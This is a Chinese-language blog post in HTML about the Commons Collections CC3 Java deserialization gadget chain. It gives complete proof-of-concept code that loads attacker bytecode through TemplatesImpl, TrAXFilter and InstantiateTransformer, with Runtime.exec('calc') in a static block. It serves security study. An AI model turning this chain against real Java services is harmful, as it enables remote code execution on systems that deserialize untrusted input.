@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="作者：Narcher	时间：2024&#x2F;3&#x2F;18	分类：Vulnerability Analysis">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JAVA安全:CC3链">
+<meta property="og:url" content="http://example.com/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/index.html">
+<meta property="og:site_name" content="Narcherの小窝">
+<meta property="og:description" content="作者：Narcher	时间：2024&#x2F;3&#x2F;18	分类：Vulnerability Analysis">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710771803258.png">
+<meta property="og:image" content="http://example.com/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710771886159.png">
+<meta property="og:image" content="http://example.com/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710772037318.png">
+<meta property="og:image" content="http://example.com/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710810342680.png">
+<meta property="og:image" content="http://example.com/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710810463141.png">
+<meta property="og:image" content="http://example.com/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710813072129.png">
+<meta property="og:image" content="http://example.com/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710812724055.png">
+<meta property="og:image" content="http://example.com/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710813705054.png">
+<meta property="og:image" content="http://example.com/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710814078344.png">
+<meta property="og:image" content="http://example.com/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710814148732.png">
+<meta property="og:image" content="http://example.com/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710815926397.png">
+<meta property="og:image" content="http://example.com/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710816158402.png">
+<meta property="article:published_time" content="2024-03-18T06:49:00.261Z">
+<meta property="article:modified_time" content="2024-03-19T02:55:01.427Z">
+<meta property="article:author" content="Narcher Alter">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710771803258.png">
+
+<link rel="canonical" href="http://example.com/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>JAVA安全:CC3链 | Narcherの小窝</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Narcherの小窝</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Narcher Alter">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Narcherの小窝">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          JAVA安全:CC3链
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2024-03-18 14:49:00" itemprop="dateCreated datePublished" datetime="2024-03-18T14:49:00+08:00">2024-03-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2024-03-19 10:55:01" itemprop="dateModified" datetime="2024-03-19T10:55:01+08:00">2024-03-19</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><em>作者：Narcher</em>	<em>时间：2024&#x2F;3&#x2F;18</em>	<em>分类：Vulnerability Analysis</em></p>
+<span id="more"></span>
+
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>CC3这条链子和之前的几条链子不太一样，它更改了命令执行的方式。之前的几条链子都是反射调用Runtime.getRuntime.exec(“calc”)执行的命令，而CC3则是利用的动态类加载。简单来说，就是Java文件无法直接运行，需要编译成.class文件，再通过加载器加载到Java虚拟机的内存空间中才能运行。其核心便是ClassLoader类，其中的loadClass–&gt;findClass–&gt;defineClass三个方法的调用是必须的，最重要的是defineClass方法。</p>
+<p>说了那么多，不如直接写一个例子看一看：</p>
+<img src="/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710771803258.png" alt="1710771803258" style="zoom: 67%;">
+
+<p>其中，CC3_test中则是：</p>
+<img src="/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710771886159.png" alt="1710771886159" style="zoom: 50%;">
+
+<p>emmm…….</p>
+<p>了解了这些之后，应该就差不多能理解整条CC3链子了，我们直接进入正文。</p>
+<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>和往常一样，我们先看一下ysoserial中链子的调用流程：</p>
+<img src="/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710772037318.png" alt="1710772037318" style="zoom:50%;">
+
+<p>可见其中对CC1的后半部分保留完整，大致是在LazyMap.get方法的触发之前的流程给改了，我们就一点点看吧。</p>
+<h3 id="1-TemplatesImpl部分"><a href="#1-TemplatesImpl部分" class="headerlink" title="1.TemplatesImpl部分"></a>1.TemplatesImpl部分</h3><p>首先我们要找重写了defineClass方法且可序列化的类，且参数可控，往上便找到了TemplatesImpl:</p>
+<img src="/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710810342680.png" alt="1710810342680" style="zoom:67%;">
+
+<p>然后就按正常流程，一点点往上找就完了。</p>
+<p>于是便找到了调用defineClass方法的地方：</p>
+<img src="/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710810463141.png" alt="1710810463141" style="zoom: 50%;">
+
+<p>关键代码就这么多，反正就是defineTransletClasses方法中的for循环里调用了，且_bytecodes可控。</p>
+<p>再向上找：</p>
+<img src="/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710813072129.png" alt="1710813072129" style="zoom: 67%;">
+
+<p>找到了getTransletInstance方法，再向上找便找到了newTransformer：</p>
+<img src="/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710812724055.png" alt="1710812724055" style="zoom:67%;">
+
+<p>看到这里，就基本上完成了，我们只需要注意一下传参，链子的大致形状就差不多确定了。</p>
+<p>传参部分呢，我们从前往后看，正常来说看到的便只需赋值_name参数，让它不要返回null，并且_class参数不能传，因为我们要的就是defineTransletClasses方法，最关键的_bytecode必须传，因为我们要用它来作为执行代码的载体。这样编译好了之后会发现报错，调进去一看可看到问题出在调用_factory参数的地方，那么这个参数我们也要传。先看一下代码中它本身应该是什么：</p>
+<img src="/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710813705054.png" alt="1710813705054" style="zoom:67%;">
+
+<p>是TransformerFactoryImpl类的实例，那我们就传这个。</p>
+<p>那么这部分的链子就构造的差不多了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameField.set(templates,<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesField.set(templates,codes);</span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">templates.newTransformer();</span><br></pre></td></tr></table></figure>
+
+<p>对了，这里还有一点要提醒，编译执行代码的class文件的java文件需要继承AbstractTranslet这个类，不然就会报空指针错误，继承之后还让实现一下接口，我们实现了就好了。</p>
+<img src="/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710814078344.png" alt="1710814078344" style="zoom:67%;">
+
+<img src="/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710814148732.png" alt="1710814148732" style="zoom:67%;">
+
+<p>java文件内容差不多是这样：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC3_test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>剩下的话，除了要注意一下要把ChainedTransformer的内容改一下，使其触发templates的newTransformer方法就好了。我们就直接把CC1链子的前半部分拿过来：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameField.set(templates,<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesField.set(templates,codes);</span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">// templates.newTransformer();</span></span><br><span class="line">Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>),</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer= <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line"><span class="type">LazyMap</span> <span class="variable">innerMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"><span class="comment">//反射获取AnnotationInvocationHandler类</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class,innerMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line">handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);</span><br><span class="line"><span class="comment">//序列化</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;C:\\Users\\Narcher\\IdeaProjects\\CC3.txt&quot;</span>));</span><br><span class="line">oos.writeObject(handler);</span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;C:\\Users\\Narcher\\IdeaProjects\\CC3.txt&quot;</span>));</span><br><span class="line">ois.readObject();</span><br></pre></td></tr></table></figure>
+
+<p>看起来不错，但和ysoserial中的链子还是有差别，我们需要对其进行更改，把InvokerTransformer给用其他调用newTransformer的类替代掉，因为有的jdk版本中对InvokerTransformer做了过滤。ysoserial中用的是TrAXFilter和InstantiateTransformer。我们一个个看，先看TrAXFilter，再看InstantiateTransformer。</p>
+<h3 id="2-ChainedTransformer部分"><a href="#2-ChainedTransformer部分" class="headerlink" title="2.ChainedTransformer部分"></a>2.ChainedTransformer部分</h3><h4 id="2-1-TrAXFilter部分"><a href="#2-1-TrAXFilter部分" class="headerlink" title="2.1 TrAXFilter部分"></a>2.1 TrAXFilter部分</h4><img src="/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710815926397.png" alt="1710815926397" style="zoom:67%;">
+
+<p>可见其构造器，我们直接传入templates对象便可调用其newTransformer方法，只是可惜TrAXFilter没有实现Serializable接口，只能用TrAXFilter配合反射来解决这个问题，于是便有了InstantiateTransformer。</p>
+<h4 id="2-2-InstantiateTransformer部分"><a href="#2-2-InstantiateTransformer部分" class="headerlink" title="2.2 InstantiateTransformer部分"></a>2.2 InstantiateTransformer部分</h4><img src="/2024/03/18/JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710816158402.png" alt="1710816158402" style="zoom:67%;">
+
+<p>关键代码就这些，我们只需要把TrAXFilter.class作为input参数传进去就好了，至于paramTypes我们可以传一个new Class[]{Templates.class}，而参数就直接传构造好的templates，把链子构造起来就是如下模样：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer= <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-构造链"><a href="#3-构造链" class="headerlink" title="3.构造链"></a>3.构造链</h3><p>我们直接把ChainedTransformer部分的修改给添上去就好了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"><span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">nameField.set(templates,<span class="string">&quot;aaaa&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;C://Users//Narcher//IdeaProjects//CC3_test.class&quot;</span>));</span><br><span class="line"><span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">bytecodesField.set(templates,codes);</span><br><span class="line"><span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"><span class="comment">// templates.newTransformer();</span></span><br><span class="line">Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer= <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line"><span class="type">LazyMap</span> <span class="variable">innerMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(map, chainedTransformer);</span><br><span class="line"><span class="comment">//反射获取AnnotationInvocationHandler类</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Target.class,innerMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line">handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);</span><br><span class="line"><span class="comment">//序列化</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;C:\\Users\\Narcher\\IdeaProjects\\CC3.txt&quot;</span>));</span><br><span class="line">oos.writeObject(handler);</span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;C:\\Users\\Narcher\\IdeaProjects\\CC3.txt&quot;</span>));</span><br><span class="line">ois.readObject();</span><br></pre></td></tr></table></figure>
+
+<p>这样一来，CC3也便大功告成了。</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2024/03/17/JAVA%E5%AE%89%E5%85%A8CC6%E9%93%BE/" rel="prev" title="JAVA安全:CC6链">
+      <i class="fa fa-chevron-left"></i> JAVA安全:CC6链
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
